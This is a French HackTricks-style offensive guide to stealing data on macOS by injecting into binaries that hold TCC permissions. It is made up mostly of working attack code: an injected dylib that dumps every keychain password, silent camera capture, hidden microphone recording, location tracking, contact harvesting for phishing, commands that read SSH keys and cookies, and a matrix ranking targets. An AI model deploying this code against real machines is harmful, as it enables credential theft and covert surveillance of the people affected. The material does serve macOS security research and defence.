# Vol de credentials et de données via les permissions TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

macOS TCC (Transparency, Consent, and Control) protège l'accès aux données utilisateur sensibles. Lorsqu'un attaquant **compromet un binary qui possède déjà des autorisations TCC**, il hérite de ces permissions. Cette page documente le potentiel d'exploitation de chaque permission TCC liée au vol de données.<sup>[[2]](#references)</sup>

> [!WARNING]
> L'injection de code dans un binary autorisé par TCC (via l'injection DYLD, le détournement de dylib ou le task port) **hérite silencieusement de toutes ses permissions TCC**. Aucun prompt ni aucune vérification supplémentaire n'est effectué lorsque le même processus lit des données protégées.<sup>[[4]](#references)</sup>

---

## Groupes d'accès au Keychain

### Le gain

Le Keychain de macOS stocke :
- **Mots de passe Wi-Fi** — tous les credentials des réseaux sans fil enregistrés
- **Mots de passe de sites Web** — mots de passe de Safari, Chrome (lorsqu'il utilise le Keychain) et autres browsers
- **Mots de passe d'applications** — comptes de messagerie, credentials VPN, tokens de développement
- **Certificats et clés privées** — signature de code, TLS client, chiffrement S/MIME
- **Notes sécurisées** — secrets stockés par l'utilisateur

### Entitlement : `keychain-access-groups`

Les éléments du Keychain sont organisés en **groupes d'accès**. L'entitlement `keychain-access-groups` d'une application liste les groupes auxquels elle peut accéder :<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Accès à la caméra (kTCCServiceCamera)

### Exploitation

Un binaire bénéficiant d’une autorisation TCC pour la caméra (via `kTCCServiceCamera` ou l’entitlement `com.apple.security.device.camera`) peut capturer des photos et des vidéos :
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Capture silencieuse
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> À partir de **macOS Sonoma**, l’indicateur de caméra dans la barre des menus est permanent et ne peut pas être masqué par programmation. Sur les **anciennes versions de macOS**, une capture brève peut ne pas produire d’indicateur visible.

---

## Accès au microphone (kTCCServiceMicrophone)

### Exploitation

L’accès au microphone capture tous les sons provenant du micro intégré, du casque ou des périphériques d’entrée audio connectés :
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attaque : Enregistrement ambiant
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Suivi de la localisation (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Suivi continu
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Contacts / Calendrier / Photos

### Exfiltration de données personnelles

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Noms, e-mails, téléphones, adresses |
| `kTCCServiceCalendar` | `EventKit` | Réunions, participants, lieux |
| `kTCCServicePhotos` | `Photos.framework` | Photos, captures d’écran, métadonnées de localisation |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Collecte des contacts
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Accès au compte iCloud

### Entitlement: `com.apple.private.icloud-account-access`

Cet entitlement permet de communiquer avec le service XPC `com.apple.iCloudHelper`, offrant un accès à :
- **iCloud tokens** — tokens d’authentification de l’Apple ID de l’utilisateur
- **iCloud Drive** — documents synchronisés depuis tous les appareils
- **iCloud Keychain** — mots de passe synchronisés sur tous les appareils Apple
- **Find My** — localisation de tous les appareils Apple de l’utilisateur<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromettre un binaire doté de droits iCloud étend l'attaque d'un **seul appareil à l'ensemble de l'écosystème Apple** : autres Mac, iPhone, iPad, Apple Watch. La synchronisation du trousseau iCloud permet d'accéder aux mots de passe de tous les appareils.

---

## Accès complet au disque (kTCCServiceSystemPolicyAllFiles)

### La permission TCC la plus puissante

L'accès complet au disque permet de lire **tous les fichiers du système**, notamment :
- Les données d'autres applications (Messages, Mail, historique de Safari)
- Les bases de données TCC (révélant toutes les autres permissions)
- Les clés et la configuration SSH
- Les cookies des navigateurs et les jetons de session
- Les bases de données et caches des applications
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matrice des priorités d'exploitation

Lors de l'évaluation des binaires bénéficiant de permissions TCC et pouvant être injectés, donnez la priorité selon la valeur des données :

| Priorité | Permission TCC | Pourquoi |
|---|---|---|
| **Critique** | Full Disk Access | Accès à tout |
| **Critique** | TCC Manager | Peut accorder n'importe quelle permission |
| **Élevée** | Keychain Access Groups | Tous les mots de passe stockés |
| **Élevée** | iCloud Account Access | Compromission de plusieurs appareils |
| **Élevée** | Input Monitoring (ListenEvent) | Keylogging |
| **Élevée** | Accessibility | Contrôle de l'interface graphique, auto-attribution de permissions |
| **Moyenne** | Screen Capture | Capture de données visuelles |
| **Moyenne** | Camera + Microphone | Surveillance |
| **Moyenne** | Contacts + Calendar | Données pour l'ingénierie sociale |
| **Faible** | Location | Suivi physique |
| **Faible** | Photos | Données personnelles |

## Script d'énumération
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "Ce qui se passe sur votre Mac reste sur l'iCloud d'Apple ?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Exploitation de TCC](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
